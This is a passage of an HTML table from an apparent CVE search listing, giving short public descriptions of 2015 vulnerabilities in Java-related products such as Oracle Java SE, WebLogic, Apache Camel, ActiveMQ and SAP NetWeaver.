</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-6420">CVE-2015-6420</a></td>
		<td valign="top">Serialized-object interfaces in certain Cisco Collaboration and Social Media; Endpoint Clients and Client Software; Network Application, Service, and Acceleration; Network and Content Security Devices; Network Management and Provisioning; Routing and Switching - Enterprise and Service Provider; Unified Computing; Voice and Unified Communications Devices; Video, Streaming, TelePresence, and Transcoding Devices; Wireless; and Cisco Hosted Services products allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5603">CVE-2015-5603</a></td>
		<td valign="top">The HipChat for JIRA plugin before 6.30.0 for Atlassian JIRA allows remote authenticated users to execute arbitrary Java code via unspecified vectors, related to "Velocity Template Injection Vulnerability."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5463">CVE-2015-5463</a></td>
		<td valign="top">AxiomSL's Axiom java applet module (used for editing uploaded Excel files and associated Java RMI services) 9.5.3 and earlier allows remote attackers to (1) access data of other basic users through arbitrary SQL commands, (2) perform a horizontal and vertical privilege escalation, (3) cause a Denial of Service on global application, or (4) write/read/delete arbitrary files on server hosting the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5348">CVE-2015-5348</a></td>
		<td valign="top">Apache Camel 2.6.x through 2.14.x, 2.15.x before 2.15.5, and 2.16.x before 2.16.1, when using (1) camel-jetty or (2) camel-servlet as a consumer in Camel routes, allow remote attackers to execute arbitrary commands via a crafted serialized Java object in an HTTP request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5344">CVE-2015-5344</a></td>
		<td valign="top">The camel-xstream component in Apache Camel before 2.15.5 and 2.16.x before 2.16.1 allow remote attackers to execute arbitrary commands via a crafted serialized Java object in an HTTP request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5254">CVE-2015-5254</a></td>
		<td valign="top">Apache ActiveMQ 5.x before 5.13.0 does not restrict the classes that can be serialized in the broker, which allows remote attackers to execute arbitrary code via a crafted serialized Java Message Service (JMS) ObjectMessage object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5236">CVE-2015-5236</a></td>
		<td valign="top">It was discovered that the IcedTea-Web used codebase attribute of the &lt;applet&gt; tag on the HTML page that hosts Java applet in the Same Origin Policy (SOP) checks. As the specified codebase does not have to match the applet's actual origin, this allowed malicious site to bypass SOP via spoofed codebase value.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5220">CVE-2015-5220</a></td>
		<td valign="top">The Web Console in Red Hat Enterprise Application Platform (EAP) before 6.4.4 and WildFly (formerly JBoss Application Server) allows remote attackers to cause a denial of service (memory consumption) via a large request header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5187">CVE-2015-5187</a></td>
		<td valign="top">Candlepin allows remote attackers to obtain sensitive information by obtaining Java exception statements as a result of excessive web traffic.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5041">CVE-2015-5041</a></td>
		<td valign="top">The J9 JVM in IBM SDK, Java Technology Edition 6 before SR16 FP20, 6 R1 before SR8 FP20, 7 before SR9 FP30, and 7 R1 before SR3 FP30 allows remote attackers to obtain sensitive information or inject data by invoking non-public interface methods.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-5006">CVE-2015-5006</a></td>
		<td valign="top">IBM Java Security Components in IBM SDK, Java Technology Edition 8 before SR2, 7 R1 before SR3 FP20, 7 before SR9 FP20, 6 R1 before SR8 FP15, and 6 before SR16 FP15 allow physically proximate attackers to obtain sensitive information by reading the Kerberos Credential Cache.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4916">CVE-2015-4916</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u60 and JavaFX 2.2.85 allows remote attackers to affect confidentiality via unknown vectors, a different vulnerability than CVE-2015-4906 and CVE-2015-4908.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4911">CVE-2015-4911</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60; Java SE Embedded 8u51; and JRockit R28.3.7 allows remote attackers to affect availability via vectors related to JAXP, a different vulnerability than CVE-2015-4803 and CVE-2015-4893.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4908">CVE-2015-4908</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u60 and JavaFX 2.2.85 allows remote attackers to affect confidentiality via unknown vectors, a different vulnerability than CVE-2015-4906 and CVE-2015-4916.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4906">CVE-2015-4906</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u60 and JavaFX 2.2.85 allows remote attackers to affect confidentiality via unknown vectors related to JavaFX, a different vulnerability than CVE-2015-4908 and CVE-2015-4916.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4903">CVE-2015-4903</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality via vectors related to RMI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4902">CVE-2015-4902</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60 allows remote attackers to affect integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4901">CVE-2015-4901</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u60 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4893">CVE-2015-4893</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60; Java SE Embedded 8u51; and JRockit R28.3.7 allows remote attackers to affect availability via vectors related to JAXP, a different vulnerability than CVE-2015-4803 and CVE-2015-4911.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4888">CVE-2015-4888</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2015-4796.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4883">CVE-2015-4883</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to RMI, a different vulnerability than CVE-2015-4860.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4882">CVE-2015-4882</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect availability via vectors related to CORBA.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4881">CVE-2015-4881</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA, a different vulnerability than CVE-2015-4835.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4872">CVE-2015-4872</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60; Java SE Embedded 8u51; and JRockit R28.3.7 allows remote attackers to affect integrity via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4871">CVE-2015-4871</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u85 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4868">CVE-2015-4868</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u60 and Java SE Embedded 8u51 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4860">CVE-2015-4860</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to RMI, a different vulnerability than CVE-2015-4883.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4852">CVE-2015-4852</a></td>
		<td valign="top">The WLS Security component in Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to execute arbitrary commands via a crafted serialized Java object in T3 protocol traffic to TCP port 7001, related to oracle_common/modules/com.bea.core.apache.commons.collections.jar. NOTE: the scope of this CVE is limited to the WebLogic Server product.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4845">CVE-2015-4845</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle Application Object Library component in Oracle E-Business Suite 11.5.10.2, 12.0.6, 12.1.3, 12.2.3, and 12.2.4 allows remote attackers to affect confidentiality via vectors related to Java APIs - AOL/J.  NOTE: the previous information is from the October 2015 CPU. Oracle has not commented on third-party claims that this issue allows remote attackers to enumerate database users via a series of requests to Aoljtest.js.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4844">CVE-2015-4844</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4843">CVE-2015-4843</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4842">CVE-2015-4842</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality via vectors related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4840">CVE-2015-4840</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u85 and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4835">CVE-2015-4835</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA, a different vulnerability than CVE-2015-4881.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4810">CVE-2015-4810</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u85 and 8u60 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4806">CVE-2015-4806</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality and integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4805">CVE-2015-4805</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Serialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4803">CVE-2015-4803</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85, and 8u60; Java SE Embedded 8u51; and JRockit R28.3.7 allows remote attackers to affect availability via vectors related to JAXP, a different vulnerability than CVE-2015-4893 and CVE-2015-4911.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4796">CVE-2015-4796</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.2.0.4, 12.1.0.1, and 12.1.0.2, when running on Windows, allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2015-4888.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4794">CVE-2015-4794</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4760">CVE-2015-4760</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4749">CVE-2015-4749</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45; JRockit R28.3.6; and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect availability via vectors related to JNDI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4748">CVE-2015-4748</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45; JRockit R28.3.6; and Java SE Embedded 7u75 and Embedded 8u33 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4744">CVE-2015-4744</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle GlassFish Server component in Oracle Fusion Middleware 2.1.1, 3.0.1, and 3.1.2; and the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6.0, 12.1.1.0, 12.1.2.0, and 12.1.3.0 allows remote attackers to affect integrity via unknown vectors related to Java Server Faces.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4736">CVE-2015-4736</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u80 and 8u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4734">CVE-2015-4734</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u101, 7u85 and 8u60, and Java SE Embedded 8u51, allows remote attackers to affect confidentiality via vectors related to JGSS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4733">CVE-2015-4733</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45, and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to RMI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4732">CVE-2015-4732</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45, and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2015-2590.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4731">CVE-2015-4731</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45; Java SE Embedded 7u75; and Java SE Embedded 8u33 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4729">CVE-2015-4729</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u80 and 8u45 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4559">CVE-2015-4559</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the product deployment feature in the Java core web services in Intel McAfee ePolicy Orchestrator (ePO) before 5.1.2 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4535">CVE-2015-4535</a></td>
		<td valign="top">Java Method Server (JMS) in EMC Documentum Content Server before 6.7SP1 P32, 6.7SP2 before P25, 7.0 before P19, 7.1 before P16, and 7.2 before P02, when __debug_trace__ is configured, allows remote authenticated users to gain super-user privileges by leveraging the ability to read a log file containing a login ticket.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4534">CVE-2015-4534</a></td>
		<td valign="top">Java Method Server (JMS) in EMC Documentum Content Server before 6.7SP1 P32, 6.7SP2 before P25, 7.0 before P19, 7.1 before P16, and 7.2 before P02 allows remote authenticated users to execute arbitrary code by forging a signature for a query string that lacks the method_verb parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4296">CVE-2015-4296</a></td>
		<td valign="top">Nexus Data Broker (NDB) on Cisco Nexus 3000 devices with software 6.0(2)A6(1) allows remote attackers to cause a denial of service (Java process restart) via crafted connections to the Java application, aka Bug ID CSCut87006.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4165">CVE-2015-4165</a></td>
		<td valign="top">The snapshot API in Elasticsearch before 1.6.0 when another application exists on the system that can read Lucene files and execute code from them, is accessible by the attacker, and the Java VM on which Elasticsearch is running can write to a location that the other application can read and execute from, allows remote authenticated users to write to and create arbitrary snapshot metadata files, and potentially execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4158">CVE-2015-4158</a></td>
		<td valign="top">SAP ABAP &amp; Java Server allows remote attackers to cause a denial of service (service termination) via unspecified vectors, aka SAP Security Note 2121661.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-4091">CVE-2015-4091</a></td>
		<td valign="top">XML external entity (XXE) vulnerability in SAP NetWeaver AS Java 7.4 allows remote attackers to send TCP requests to intranet servers or possibly have unspecified other impact via an XML request to tc~sld~wd~main/Main, related to "CIM UPLOAD," aka SAP Security Note 2090851.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-3844">CVE-2015-3844</a></td>
		<td valign="top">The getProcessRecordLocked method in services/core/java/com/android/server/am/ActivityManagerService.java in ActivityManager in Android before 5.1.1 LMY48I allows attackers to trigger incorrect process loading via a crafted application, as demonstrated by interfering with use of the Settings application, aka internal bug 21669445.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-3833">CVE-2015-3833</a></td>
		<td valign="top">The getRunningAppProcesses function in services/core/java/com/android/server/am/ActivityManagerService.java in Android before 5.1.1 LMY48I allows attackers to bypass intended getRecentTasks restrictions and discover the name of the foreground application via a crafted application, aka internal bug 20034603.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-3292">CVE-2015-3292</a></td>
		<td valign="top">The installer in NetApp OnCommand Workflow Automation before 2.2.1P1 and 3.x before 3.0P1 sets up the Java Debugging Wire Protocol (JDWP) service, which allows remote attackers to execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2980">CVE-2015-2980</a></td>
		<td valign="top">The Yodobashi application 1.2.1.0 and earlier for Android allows remote attackers to execute arbitrary Java methods, and consequently obtain sensitive information or execute OS commands, via a crafted HTML document.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2828">CVE-2015-2828</a></td>
		<td valign="top">CA Spectrum 9.2.x and 9.3.x before 9.3 H02 does not properly validate serialized Java objects, which allows remote authenticated users to obtain administrative privileges via crafted object data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2683">CVE-2015-2683</a></td>
		<td valign="top">Citrix Command Center before 5.1 Build 35.4 and 5.2 before Build 42.7 does not properly restrict access to the Advent Java Management Extensions (JMX) Servlet, which allows remote attackers to execute arbitrary code via unspecified vectors to servlets/Jmx_dynamic.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2664">CVE-2015-2664</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2659">CVE-2015-2659</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 8u45 and Java SE Embedded 8u33 allows remote attackers to affect availability via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2638">CVE-2015-2638</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45; JavaFX 2.2.80; and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2637">CVE-2015-2637</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45; JavaFX 2.2.80; and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2632">CVE-2015-2632</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45 allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2629">CVE-2015-2629</a></td>
		<td valign="top">Unspecified vulnerability in the Java VM component in Oracle Database Server 11.1.0.7, 11.2.0.3, 11.2.0.4, 12.1.0.1, and 12.1.0.2 allows remote authenticated users to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2015-0457.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2628">CVE-2015-2628</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45, and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2627">CVE-2015-2627</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45 allows remote attackers to affect confidentiality via unknown vectors related to installation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2625">CVE-2015-2625</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45; JRockit R28.3.6; and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality via vectors related to JSSE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2623">CVE-2015-2623</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle GlassFish Server component in Oracle Fusion Middleware 3.0.1 and 3.1.2, and the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6.0, 12.1.1.0, 12.1.2.0, and 12.1.3.0, allows remote attackers to affect integrity via unknown vectors related to Java Server Faces.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2621">CVE-2015-2621</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45, and Java SE Embedded 7u75 and 8u33, allows remote attackers to affect confidentiality via vectors related to JMX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2619">CVE-2015-2619</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u80 and 8u45, JavaFX 2.2.80, and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2613">CVE-2015-2613</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u80 and 8u45, and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality via vectors related to JCE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2601">CVE-2015-2601</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45, JRockit R28.3.6, and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality via vectors related to JCE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2597">CVE-2015-2597</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u80 and 8u45 allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Install.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2596">CVE-2015-2596</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u80 allows remote attackers to affect integrity via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2590">CVE-2015-2590</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u95, 7u80, and 8u45, and Java SE Embedded 7u75 and 8u33 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2015-4732.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2015-2282">CVE-2015-2282</a></td>
		<td valign="top">Stack-based buffer overflow in the LZC decompression implementation (CsObjectInt::CsDecomprLZC function in vpa106cslzc.cpp) in SAP MaxDB 7.5 and 7.6, Netweaver Application Server ABAP, Netweaver Application Server Java, Netweaver RFC SDK, GUI, RFC SDK, SAPCAR archive tool, and other products allows context-dependent attackers to cause a denial of service (crash) or possibly execute arbitrary code via unspecified vectors, aka SAP Security Note 2124806, 2121661, 2127995, and 2125316.

</td>
	</tr>
	<tr>
